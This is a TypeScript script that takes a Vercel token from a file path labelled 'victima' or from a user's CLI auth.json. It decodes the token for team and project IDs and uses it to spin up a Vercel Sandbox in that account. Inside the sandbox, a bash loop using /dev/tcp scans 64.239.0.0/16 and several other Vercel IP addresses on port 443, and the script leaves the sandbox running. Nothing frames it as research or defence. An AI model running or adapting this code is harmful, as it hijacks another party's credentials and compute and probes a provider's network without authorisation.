import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "scan2-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "===== scan 64.239.0.0/16 (443) ====="
for i in $(seq 1 255); do
  ip="64.239.$i.1"
  if timeout 2 bash -c "timeout 1.5 bash -c 'echo > /dev/tcp/$ip/443' 2>/dev/null"; then
    echo "OPEN 64.239.$i.0/24"
  fi
done
echo "scan done"
echo "===== otros bloques vercel ====="
for ip in 76.76.21.22 66.33.60.129 216.198.79.131 64.29.17.131 198.169.2.65 76.76.21.112; do
  echo -n "$ip:443 -> "
  timeout 3 bash -c "timeout 2 bash -c 'echo > /dev/tcp/$ip/443' 2>/dev/null" && echo "OPEN" || echo "closed"
done
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 90_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });